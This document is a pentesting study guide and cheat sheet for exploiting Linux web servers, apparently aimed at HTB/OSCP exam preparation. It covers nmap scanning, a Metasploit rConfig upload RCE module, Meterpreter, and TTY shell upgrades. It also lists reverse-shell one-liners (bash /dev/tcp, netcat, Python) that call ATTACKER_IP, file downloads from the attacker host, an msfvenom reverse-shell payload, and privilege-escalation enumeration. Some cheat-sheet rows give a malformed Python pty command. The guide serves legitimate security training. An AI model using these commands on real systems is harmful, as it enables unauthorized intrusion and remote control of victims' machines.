# 1️⃣ Why Linux Is Important for Pentesting

Over **70% of web servers run Unix/Linux**, making it the most common OS in web infrastructure.

Common Linux usage:

- Web servers (Apache, Nginx)
    
- Databases (MySQL, PostgreSQL)
    
- Cloud servers (AWS, Azure, GCP)
    
- Internal infrastructure servers
    

Goal: Gain shell → escalate privileges → pivot deeper into network

---

## 📊 Linux Server Attack Surface

![Image](https://www.researchgate.net/publication/265398254/figure/fig2/AS%3A669454300110854%401536621751593/Attack-Surface-Example-Threat-modeling-then-analyzes-the-data-flow-diagram-as-shown-in.jpg)

![Image](https://relevant.software/media-webp/RelevantSoftware-Web-application-penetration-testing-methodology-1.jpg.webp)

![Image](https://upload.wikimedia.org/wikipedia/commons/8/82/LAMP_software_bundle.svg)

![Image](https://www.researchgate.net/publication/7032895/figure/fig2/AS%3A287841717374976%401445638221395/System-architecture-The-system-used-the-PHP-504-Apache-1333-Win32-and-MySQL.png)

---

# 2️⃣ Key Questions Before Exploiting Linux

Always identify:

| Question                | Purpose                  |
| ----------------------- | ------------------------ |
| Linux distribution?     | Identify vulnerabilities |
| Running services?       | Identify attack surface  |
| Applications installed? | Exploit vulnerable apps  |
| Available shells?       | Payload compatibility    |
| Known vulnerabilities?  | Exploitation path        |

---

# 3️⃣ Enumeration with Nmap

Command:

```bash
nmap -sC -sV TARGET_IP
```

Example output:

```text
PORT     SERVICE VERSION
21/tcp   ftp     vsftpd
22/tcp   ssh     OpenSSH 7.4
80/tcp   http    Apache 2.4.6 (CentOS)
443/tcp  https   Apache 2.4.6
3306/tcp mysql   MySQL
```

---

# 4️⃣ Identify Target System Information

From scan output:

| Component  | Value        |
| ---------- | ------------ |
| OS         | CentOS Linux |
| Web Server | Apache 2.4.6 |
| Language   | PHP 7.2.34   |
| Database   | MySQL        |
| SSH        | OpenSSH      |

Conclusion:

Target is a web server running CentOS with Apache + PHP.

---

# 5️⃣ Web Application Enumeration

Visit target in browser:

```text
http://TARGET_IP
```

Example discovery:

Application: rConfig

Purpose:

- Network configuration management
    
- Admin access to routers/switches
    
- Critical infrastructure application
    

Compromise impact: Full network compromise

---

## 📊 Web Application Attack Surface

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/0%2AoXZUH3okBu57qxzA)

![Image](https://media.licdn.com/dms/image/v2/D4D12AQHadOj1wHPwDA/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1673886990132?e=2147483647&t=i1LoNiRHVa661BT0YVhURjV7SqFzgMlz6vwUJHPgIDI&v=beta)

![Image](https://www.researchgate.net/publication/354061244/figure/fig1/AS%3A1059592549179394%401629637958870/Flow-chart-for-the-web-application.ppm)

![Image](https://devopedia.org/images/article/290/9425.1603804132.png)

---

# 6️⃣ Identify Vulnerabilities

Search vulnerability:

```text
rConfig 3.9.6 exploit
```

Sources:

- ExploitDB
    
- CVE database
    
- GitHub
    
- Metasploit modules
    

---

# 7️⃣ Search Exploit in Metasploit

Command:

```bash
msfconsole
```

```bash
search rconfig
```

Example result:

```text
exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

---

# 8️⃣ Load Exploit Module

Command:

```bash
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

View options:

```bash
options
```

Set required options:

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
```

---

# 9️⃣ Execute Exploit

Command:

```bash
exploit
```

Result:

```text
Meterpreter session opened
```

Exploit actions:

| Step | Action                   |
| ---- | ------------------------ |
| 1    | Check vulnerable version |
| 2    | Authenticate to web app  |
| 3    | Upload PHP payload       |
| 4    | Execute payload          |
| 5    | Establish reverse shell  |

---

## 📊 Linux Reverse Shell Exploitation Flow

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/676182bc78b8b88106a17157_626822d9beb1b531fd597ae2_Reverse%2520Shell%2520in%2520action.jpeg)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://manage.offsec.com/app/uploads/2015/03/EXPLOIT04B.png)

---

# 🔟 Meterpreter Shell Commands

Basic commands:

```bash
whoami
```

```bash
pwd
```

```bash
ls
```

```bash
sysinfo
```

Drop to system shell:

```bash
shell
```

---

# 1️⃣1️⃣ Non-TTY Shell Problem

Non-TTY shell example:

```bash
ls
whoami
```

Missing features:

- No proper prompt
    
- Cannot use sudo properly
    
- Cannot switch users
    

Example user:

```bash
apache
```

---

# 1️⃣2️⃣ Spawn TTY Shell Using Python

Check Python:

```bash
which python
```

Spawn TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Result:

```bash
sh-4.2$
```

You now have full interactive shell.

---

# 1️⃣3️⃣ Why TTY Shell Is Important

Benefits:

|Feature|Non-TTY|TTY|
|---|---|---|
|sudo|❌|✅|
|su|❌|✅|
|interactive commands|❌|✅|
|stable shell|❌|✅|

---

## 📊 TTY Shell Upgrade Process

![Image](https://i.sstatic.net/rcApN.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/0%2AD7RVaZfx8HPJSwhM.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6915b40b4d0c9f662902ed94_5cc923e6.png)

---

# 1️⃣4️⃣ Identify Current User

Command:

```bash
whoami
```

Example:

```text
apache
```

This indicates web server user.

---

# 1️⃣5️⃣ Common Linux Shell Users

|User|Purpose|
|---|---|
|root|Administrator|
|apache|Web server|
|www-data|Web server|
|mysql|Database|

---

# 1️⃣6️⃣ Linux Payload Types

|Payload|Extension|
|---|---|
|ELF|.elf|
|Bash|.sh|
|Python|.py|
|PHP|.php|

---

# 1️⃣7️⃣ Linux Exploitation Workflow

Step-by-step:

```bash
nmap -sC -sV TARGET_IP
```

Identify web app

Search exploit:

```bash
search application exploit
```

Load exploit:

```bash
use exploit/module
```

Set options:

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
```

Run exploit:

```bash
exploit
```

Get shell:

```bash
shell
```

Spawn TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

# 1️⃣8️⃣ Post Exploitation Commands

System info:

```bash
uname -a
```

```bash
id
```

```bash
cat /etc/passwd
```

Network info:

```bash
ip a
```

```bash
netstat -antp
```

---

# 1️⃣9️⃣ Privilege Escalation Preparation

Check sudo:

```bash
sudo -l
```

Check SUID files:

```bash
find / -perm -4000 2>/dev/null
```

Check cron jobs:

```bash
crontab -l
```

---

# 2️⃣0️⃣ Linux Exploitation Chain Summary

```text
Scan → Identify Linux → Find vulnerable app → Exploit → Upload payload → Reverse shell → Spawn TTY → Privilege escalation
```

---

# 2️⃣1️⃣ Most Important Commands Cheat Sheet

|Task|Command|
|---|---|
|Scan target|nmap -sC -sV TARGET_IP|
|Find exploit|search exploit|
|Run exploit|exploit|
|Get shell|shell|
|Upgrade shell|python -c 'import pty.spawn("/bin/sh")'|
|Check user|whoami|
|Check privileges|sudo -l|

---
# 🐧 Linux Exploitation Cheat Sheet (Table Mode – HTB / OSCP / Pentest)

---

# 1️⃣ Linux Host Identification

|Method|Command|Purpose|Expected Result|
|---|---|---|---|
|Ping TTL|`ping TARGET_IP`|Identify OS|TTL ≈ 64 → Linux|
|Nmap OS Detection|`nmap -O TARGET_IP`|Detect OS|Linux identified|
|Full Scan|`nmap -A TARGET_IP`|Identify services|Apache, SSH, MySQL|

---

# 2️⃣ Service Enumeration

|Service|Port|Command|Purpose|
|---|---|---|---|
|FTP|21|`nmap -p21 TARGET_IP`|FTP access|
|SSH|22|`nmap -p22 TARGET_IP`|Remote login|
|HTTP|80|`nmap -p80 TARGET_IP`|Web server|
|HTTPS|443|`nmap -p443 TARGET_IP`|Secure web|
|MySQL|3306|`nmap -p3306 TARGET_IP`|Database|

---

# 3️⃣ Web Enumeration

|Task|Command|Purpose|
|---|---|---|
|Open website|`http://TARGET_IP`|Identify web app|
|Banner grab|`nmap --script banner TARGET_IP`|Service info|
|Directory brute force|`gobuster dir -u http://TARGET_IP -w wordlist.txt`|Find hidden files|

---

# 4️⃣ Vulnerability Discovery

|Task|Command|Purpose|
|---|---|---|
|Search exploit|`searchsploit apache`|Find exploits|
|Metasploit search|`search rconfig`|Find MSF modules|
|CVE search|Google app version + exploit|Find vulnerabilities|

---

# 5️⃣ Exploit Execution (Metasploit)

|Step|Command|Purpose|
|---|---|---|
|Start MSF|`msfconsole`|Launch Metasploit|
|Search exploit|`search exploit_name`|Find exploit|
|Use exploit|`use exploit/module`|Load exploit|
|Set target|`set RHOSTS TARGET_IP`|Target system|
|Set attacker|`set LHOST ATTACKER_IP`|Callback IP|
|Run exploit|`exploit`|Execute exploit|

---

# 6️⃣ Meterpreter Commands

|Command|Purpose|
|---|---|
|sysinfo|System info|
|getuid|Current user|
|pwd|Current directory|
|ls|List files|
|shell|System shell|
|upload file|Upload file|
|download file|Download file|

---

# 7️⃣ Basic Linux Commands After Shell

|Command|Purpose|
|---|---|
|whoami|Current user|
|id|User privileges|
|pwd|Current directory|
|ls|List files|
|uname -a|System info|
|hostname|System name|

---

# 8️⃣ Upgrade Non-TTY Shell

|Task|Command|Purpose|
|---|---|---|
|Check python|`which python`|Check availability|
|Spawn TTY|`python -c 'import pty; pty.spawn("/bin/sh")'`|Upgrade shell|
|Alternative|`python3 -c 'import pty; pty.spawn("/bin/bash")'`|Better shell|

---

# 9️⃣ Privilege Escalation Enumeration

|Task|Command|Purpose|
|---|---|---|
|Check sudo|`sudo -l`|Check sudo rights|
|Find SUID files|`find / -perm -4000 2>/dev/null`|Priv esc|
|Check cron jobs|`crontab -l`|Scheduled tasks|
|Check passwd|`cat /etc/passwd`|User accounts|
|Check kernel|`uname -r`|Kernel exploits|

---

# 🔟 Network Enumeration

|Command|Purpose|
|---|---|
|ip a|IP address|
|ifconfig|Network info|
|netstat -antp|Open ports|
|ss -tulpn|Listening services|

---

# 1️⃣1️⃣ File Transfer (Attacker → Target)

|Method|Command|
|---|---|
|Python server|`python3 -m http.server 8000`|
|Download file|`wget http://ATTACKER_IP:8000/file`|
|Curl download|`curl http://ATTACKER_IP/file -o file`|

---

# 1️⃣2️⃣ Reverse Shell Commands

|Shell|Command|
|---|---|
|Bash|`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`|
|Netcat|`nc ATTACKER_IP 4444 -e /bin/bash`|
|Python|`python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));pty.spawn("/bin/bash")'`|

---

# 1️⃣3️⃣ Payload Creation (MSFvenom)

|Task|Command|
|---|---|
|Create payload|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf`|
|Execute payload|`chmod +x shell.elf && ./shell.elf`|

---

# 1️⃣4️⃣ Privilege Escalation Checks

|Task|Command|
|---|---|
|SUID binaries|`find / -perm -4000`|
|Writable files|`find / -writable 2>/dev/null`|
|Cron jobs|`ls -la /etc/cron*`|
|Running processes|`ps aux`|

---

# 1️⃣5️⃣ Identify Shell Type

|Prompt|Shell|
|---|---|
|$|User shell|
|#|Root shell|
|meterpreter >|Meterpreter|
|sh-4.2$|TTY shell|

---

# 1️⃣6️⃣ Important Linux Directories

|Directory|Purpose|
|---|---|
|/etc|Config files|
|/home|User directories|
|/var/www|Web root|
|/tmp|Temporary files|
|/root|Root directory|

---

# 1️⃣7️⃣ Exploitation Workflow (Exam Ready)

|Step|Command|
|---|---|
|Scan|`nmap -sC -sV TARGET_IP`|
|Identify services|Analyze output|
|Find exploit|`searchsploit service`|
|Run exploit|Metasploit exploit|
|Get shell|`shell`|
|Upgrade shell|Python pty.spawn|
|Priv esc|sudo -l|

---

# 1️⃣8️⃣ Most Important Commands (Quick Use)

|Task|Command|
|---|---|
|Scan target|nmap -sC -sV TARGET_IP|
|Get shell|exploit|
|Upgrade shell|python -c 'import pty.spawn("/bin/sh")'|
|Check user|whoami|
|Check sudo|sudo -l|
|Check kernel|uname -a|

---

# 1️⃣9️⃣ Full Linux Attack Chain

|Step|Action|
|---|---|
|1|Scan target|
|2|Identify Linux|
|3|Enumerate services|
|4|Find vulnerability|
|5|Run exploit|
|6|Get shell|
|7|Upgrade shell|
|8|Privilege escalation|

---

